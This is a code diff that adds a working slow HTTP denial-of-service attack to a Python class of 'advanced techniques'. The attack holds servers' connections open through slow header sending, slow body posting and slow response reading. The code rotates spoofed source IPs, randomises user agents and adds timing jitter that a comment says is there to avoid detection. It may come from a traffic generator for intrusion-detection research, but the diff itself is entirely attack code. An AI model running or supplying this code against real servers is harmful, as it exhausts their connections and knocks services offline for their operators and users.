@@ -360,3 +360,218 @@ class AdvancedTechniques:
             "type": "requests", 
             "warning_message": warning_message
         }
+    
+    def advanced_slow_http_attack(self, dst, dport=80, num_connections_per_sec=2, duration=5, run_id="", attack_variant=""):
+        """
+        Advanced slow HTTP attack with IP rotation, burst patterns, and sophisticated timing.
+        Implements slow header, slow body, and slow read techniques.
+        
+        Args:
+            dst: Target IP address
+            dport: Target port (default: 80)
+            num_connections_per_sec: Target connection rate
+            duration: Attack duration in seconds
+            run_id: Unique identifier for this attack run
+            attack_variant: Type of attack variant
+        
+        Returns:
+            dict: Attack statistics and results
+        """
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Advanced Slow HTTP - Target: {dst}:{dport}, Duration: {duration}s")
+        
+        # Pre-attack HTTP service test
+        http_test_start = time.time()
+        try:
+            import requests
+            test_url = f"http://{dst}:{dport}/"
+            test_response = requests.get(test_url, timeout=3)
+            http_test_time = time.time() - http_test_start
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} is active (status: {test_response.status_code}, time: {http_test_time:.3f}s)")
+        except requests.exceptions.Timeout:
+            http_test_time = time.time() - http_test_start
+            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} timeout (time: {http_test_time:.3f}s)")
+        except requests.exceptions.ConnectionError as e:
+            http_test_time = time.time() - http_test_start
+            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service {dst}:{dport} connection error: {e} (time: {http_test_time:.3f}s)")
+        except Exception as e:
+            http_test_time = time.time() - http_test_start
+            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] HTTP service test failed for {dst}:{dport}: {e} (time: {http_test_time:.3f}s)")
+        
+        end_time = time.time() + duration
+        sent_connections = 0
+        successful_connections = 0
+        failed_connections = 0
+        timeout_connections = 0
+        active_connections = []
+        start_time = time.time()
+        last_log_time = start_time
+        
+        # Burst mechanism parameters
+        burst_size = max(1, int(num_connections_per_sec / 10))  # Send 10% of target CPS in a burst
+        burst_interval = 0.1  # Time between bursts
+        
+        # Slow HTTP attack techniques
+        slow_techniques = ['slow_headers', 'slow_body', 'slow_read']
+        
+        while time.time() < end_time:
+            burst_start_time = time.time()
+            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Starting burst of {burst_size} slow HTTP connections")
+            
+            for _ in range(burst_size):
+                if time.time() >= end_time:
+                    break
+                
+                src = self.ip_rotator.get_random_ip()
+                technique = random.choice(slow_techniques)
+                
+                sent_connections += 1
+                try:
+                    connection_start_time = time.time()
+                    
+                    if technique == 'slow_headers':
+                        success = self._slow_headers_attack(dst, dport, src, run_id, attack_variant)
+                    elif technique == 'slow_body':
+                        success = self._slow_body_attack(dst, dport, src, run_id, attack_variant)
+                    elif technique == 'slow_read':
+                        success = self._slow_read_attack(dst, dport, src, run_id, attack_variant)
+                    
+                    connection_end_time = time.time()
+                    connection_duration = connection_end_time - connection_start_time
+                    
+                    if success:
+                        successful_connections += 1
+                        attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP {technique} from {src} succeeded (time: {connection_duration:.3f}s)")
+                    else:
+                        failed_connections += 1
+                        attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP {technique} from {src} failed (time: {connection_duration:.3f}s)")
+                        
+                except socket.timeout:
+                    timeout_connections += 1
+                    failed_connections += 1
+                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP timeout from {src}")
+                except Exception as e:
+                    failed_connections += 1
+                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Slow HTTP error from {src}: {e}")
+            
+            burst_end_time = time.time()
+            burst_duration = burst_end_time - burst_start_time
+            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Burst completed in {burst_duration:.3f}s")
+            
+            current_time = time.time()
+            if current_time - last_log_time >= 1.0:  # Log every second
+                elapsed_time = current_time - start_time
+                if elapsed_time > 0:
+                    current_cps = sent_connections / elapsed_time
+                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Connection rate: {current_cps:.2f} connections/sec, Total sent = {sent_connections}")
+                last_log_time = current_time
+            
+            # Add jitter to avoid detection based on timing patterns
+            sleep_duration = random.uniform(burst_interval * 0.8, burst_interval * 1.2)
+            time.sleep(sleep_duration)
+        
+        # Calculate final statistics
+        total_duration = time.time() - start_time
+        if total_duration > 0:
+            average_cps = sent_connections / total_duration
+            warning_message = None
+        else:
+            average_cps = 0
+            warning_message = "Attack duration too short or no connections sent."
+        
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Advanced Slow HTTP attack completed:")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total connections: {sent_connections}, Successful: {successful_connections}, Failed: {failed_connections}")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Average rate: {average_cps:.2f} connections/sec")
+        
+        return {
+            "total_sent": sent_connections, 
+            "total_successful": successful_connections, 
+            "total_failed": failed_connections, 
+            "total_timeout": timeout_connections, 
+            "average_rate": average_cps, 
+            "type": "connections", 
+            "warning_message": warning_message
+        }
+    
+    def _slow_headers_attack(self, dst, dport, src, run_id, attack_variant):
+        """Send HTTP headers very slowly to keep connection alive."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((dst, dport))
+            
+            # Send partial HTTP request slowly
+            request_parts = [
+                f"GET / HTTP/1.1\r\n",
+                f"Host: {dst}\r\n",
+                f"User-Agent: {random.choice(self.packet_crafter.user_agents)}\r\n",
+                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
+                f"Connection: keep-alive\r\n"
+            ]
+            
+            for part in request_parts:
+                sock.send(part.encode())
+                time.sleep(random.uniform(0.5, 2.0))  # Slow header sending
+            
+            # Keep connection alive by not sending final \r\n
+            time.sleep(random.uniform(1.0, 3.0))
+            sock.close()
+            return True
+            
+        except Exception as e:
+            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow headers error from {src}: {e}")
+            return False
+    
+    def _slow_body_attack(self, dst, dport, src, run_id, attack_variant):
+        """Send HTTP body very slowly after complete headers."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((dst, dport))
+            
+            # Send complete headers with Content-Length
+            body_data = "x" * 1000  # 1KB of data
+            headers = f"POST / HTTP/1.1\r\nHost: {dst}\r\nContent-Length: {len(body_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
+            sock.send(headers.encode())
+            
+            # Send body data very slowly
+            for char in body_data:
+                sock.send(char.encode())
+                time.sleep(random.uniform(0.01, 0.1))  # Very slow body sending
+            
+            sock.close()
+            return True
+            
+        except Exception as e:
+            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow body error from {src}: {e}")
+            return False
+    
+    def _slow_read_attack(self, dst, dport, src, run_id, attack_variant):
+        """Send complete request but read response very slowly."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((dst, dport))
+            
+            # Send complete HTTP request
+            request = f"GET / HTTP/1.1\r\nHost: {dst}\r\nUser-Agent: {random.choice(self.packet_crafter.user_agents)}\r\nConnection: keep-alive\r\n\r\n"
+            sock.send(request.encode())
+            
+            # Read response very slowly
+            response_data = b""
+            for _ in range(50):  # Try to read 50 times
+                try:
+                    chunk = sock.recv(1)  # Read only 1 byte at a time
+                    if chunk:
+                        response_data += chunk
+                        time.sleep(random.uniform(0.1, 0.5))  # Slow reading
+                    else:
+                        break
+                except socket.timeout:
+                    break
+            
+            sock.close()
+            return True
+            
+        except Exception as e:
+            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Slow read error from {src}: {e}")
+            return False
